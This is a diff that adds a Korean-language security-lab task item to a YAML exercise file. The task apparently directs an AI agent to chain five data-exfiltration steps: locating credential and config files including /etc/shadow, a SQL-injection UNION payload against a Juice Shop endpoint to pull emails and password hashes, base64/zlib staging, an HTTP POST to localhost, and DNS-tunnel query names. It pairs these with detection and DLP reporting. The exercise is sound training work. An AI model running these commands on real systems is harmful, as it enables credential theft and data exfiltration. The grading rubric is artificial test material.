@@ -870,3 +870,67 @@ steps:
 
     '
   script: ''
+- order: 100
+  instruction: '[Multi-task] 데이터 유출 5단계 통합 — 데이터 식별 → SQLi 추출 → Base64 stage → HTTP exfil → DNS tunnel.'
+  bastion_prompt: |
+    데이터 유출의 5 표면을 한 흐름의 chain 으로 수행해줘. 모든 실 송신은 localhost / dry-run 만.
+
+    1) [민감 데이터 식별] ssh ccc@{{WEB_IP}} 'find /etc /home /var/www -type f \( -name "*.conf" -o -name "*.env"
+       -o -name "*.sql" -o -name "*.bak" \) 2>/dev/null | head -10; ls -la /etc/shadow /etc/passwd /var/log/auth.log
+       2>/dev/null' 의 결과로 의심 파일 표 (path / size / readable by attacker / 의심 등급 H/M/L) 작성. CWE-538 매핑.
+
+    2) [SQLi 추출] curl -s "http://{{WEB_IP}}:3000/rest/products/search?q=')) UNION SELECT 1,email,password,4,5,6,7,8,9
+       FROM Users--" 의 UNION 시도. 응답 의 JSON 에서 email + password hash 발췌 (예) admin@juice-sh.op +
+       bcrypt hash). 발견된 사용자 행수 + 각 의 hash 알고리즘 (bcrypt $2a / argon2) 식별. MITRE T1005 + OWASP A03 매핑.
+
+    3) [Base64 stage] 추출 데이터를 cat /tmp/leak.json | base64 -w0 > /tmp/leak.b64 로 인코딩. 원본 size vs
+       base64 size (4/3 비율) 의 검증 + zlib 압축 (python3 -c 'import zlib,sys,base64; print(base64.b64encode(
+       zlib.compress(open(sys.argv[1],"rb").read())).decode())' /tmp/leak.json > /tmp/leak.cb64) 비교.
+       MITRE T1560.001 매핑.
+
+    4) [HTTP exfil] curl -X POST -H 'Content-Type: application/json' --data @/tmp/leak.b64
+       http://localhost:8888/upload 의 의사 호출. 실 outbound 는 X. 방어자 시점 (proxy 의 outbound POST size
+       비정상, request body entropy 의 비정상, User-Agent 의 비정상) 의 detection 표. MITRE T1041 + T1567.002 매핑.
+
+    5) [DNS tunnel] python3 -c 'import sys,base64; d=base64.urlsafe_b64encode(sys.stdin.buffer.read()).decode();
+       [print(d[i:i+30]+".exfil.lab") for i in range(0,len(d),30)]' < /tmp/leak.json | head -3 의 의사 DNS
+       query 생성. 각 query 길이 (max 63 char per label, 255 total) + entropy 분석 (Shannon > 4.5 시 의심) +
+       detection (Zeek dns.log, Suricata dns rule) 정리. MITRE T1071.004 + T1572 매핑.
+
+    마지막에 5단계 × (Exfil 표면 / 데이터 type / 인코딩 / 채널 / 대역폭 한계 / detection 신호 / Wazuh 룰)
+    의 5×7 매트릭스 + Exfil Timeline (시간순) + DLP Recommendation (즉시 5 + 단기 3) 보고서 markdown 출력.
+  hint: 데이터 유출 5 표면 chain. 실 outbound 송신 X — 모두 localhost / 의사 query.
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] 데이터 유출 5단계 — 식별/SQLi/Base64/HTTP/DNS. MITRE T1005/T1041/T1071/T1560/T1567 + CWE-538 + OWASP A03 매핑 + 5×7 매트릭스 + DLP 권고.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - SQLi UNION 페이로드 syntax 정확
+      - Base64 + zlib 압축 둘 다 시연
+      - DNS label 길이 한계 (63/255) 명시
+      - 5×7 매트릭스
+      - DLP Recommendation 8개
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - curl / python3 / base64 / find / openssl 표준
+      - localhost / 의사 query 만 (실 outbound X)
+      - DLP / Zeek / Suricata 룰 후보
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - SQLi UNION syntax 오류
+      - 실 outbound 송신 시도
+      - DNS 한계 누락
+      - 매트릭스 7 컬럼 미만
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. Exfil 5 표면 + 5×7 매트릭스 + Timeline + DLP 권고.
+  answer_detail: |
+    Threat Intel Analyst 페르소나 — Exfil chain 5 표면. 모든 outbound 는 localhost / 의사 query.
+    DLP Recommendation 이 운영팀 인계 산출물.
+  script: ''
